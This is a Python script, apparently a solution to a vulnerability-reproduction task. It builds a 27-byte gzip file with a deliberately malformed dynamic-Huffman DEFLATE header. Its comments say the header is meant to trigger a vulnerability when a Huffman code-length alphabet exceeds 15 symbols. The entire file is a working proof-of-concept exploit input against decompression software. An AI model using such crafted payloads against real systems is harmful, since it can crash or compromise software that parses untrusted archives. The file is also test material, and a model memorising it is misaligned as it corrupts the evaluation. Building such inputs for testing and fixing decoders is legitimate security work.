import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        
        class BitStream:
            def __init__(self):
                self.bits = []
            
            def write(self, value: int, num_bits: int):
                for i in range(num_bits):
                    self.bits.append((value >> i) & 1)

            def get_bytes(self) -> bytes:
                while len(self.bits) % 8 != 0:
                    self.bits.append(0)
                
                byte_array = bytearray()
                for i in range(0, len(self.bits), 8):
                    byte = 0
                    for j in range(8):
                        if self.bits[i+j] == 1:
                            byte |= (1 << j)
                    byte_array.append(byte)
                return bytes(byte_array)

        stream = BitStream()

        # DEFLATE block header
        # BFINAL=1 (final block), BTYPE=2 (dynamic Huffman)
        stream.write(1, 1)
        stream.write(2, 2)
        
        # Minimal HLIT (257 codes) and HDIST (1 code)
        stream.write(0, 5)
        stream.write(0, 5)

        # The vulnerability is triggered when the number of symbols in a Huffman
        # tree alphabet exceeds 15. The code-length alphabet size is HCLEN + 4.
        # To get 16 symbols, we set HCLEN to 12.
        stream.write(12, 4) # HCLEN = 12, so 16 code-length codes

        # Provide 16 code lengths (3 bits each).
        # To form a valid prefix tree, sum of 2^(-length) must be 1.
        # We use two codes of length 1 (2^-1 + 2^-1 = 1).
        stream.write(1, 3)
        stream.write(1, 3)
        for _ in range(14):
            stream.write(0, 3)

        # The DEFLATE stream has 17 header bits + 16*3=48 code length bits = 65 bits.
        # This pads to 72 bits, or 9 bytes.
        deflate_data = stream.get_bytes()

        # Standard 10-byte GZIP header
        gzip_header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff'

        # Standard 8-byte GZIP trailer (CRC32 and ISIZE are 0 for empty data)
        gzip_trailer = b'\x00' * 8

        # Total PoC length = 10 (header) + 9 (DEFLATE) + 8 (trailer) = 27 bytes.
        poc = gzip_header + deflate_data + gzip_trailer
        
        return poc
